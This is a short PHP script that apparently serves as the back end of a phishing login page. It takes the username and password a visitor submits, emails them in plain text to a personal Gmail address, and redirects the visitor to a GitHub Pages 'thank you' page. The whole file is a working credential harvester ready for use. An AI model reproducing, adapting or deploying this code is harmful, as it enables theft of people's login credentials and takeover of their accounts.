<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	$username = $_POST['username'];
	$password = $_POST['password'];

	// Send the form data to your email
	$to = 'dodi3son@gmail.com';
	$subject = 'Login Form Submission';
	$message = "Username: $username\nPassword: $password";
	$headers = 'From: webmaster@example.com' . "\r\n" .
    	'Reply-To: webmaster@example.com' . "\r\n" .
    	'X-Mailer: PHP/' . phpversion();

	mail($to, $subject, $message, $headers);

	// Redirect the user to a thank you page
	header('Location: https://yazidsameh.github.io/thank-page/');
	exit;
}
?>
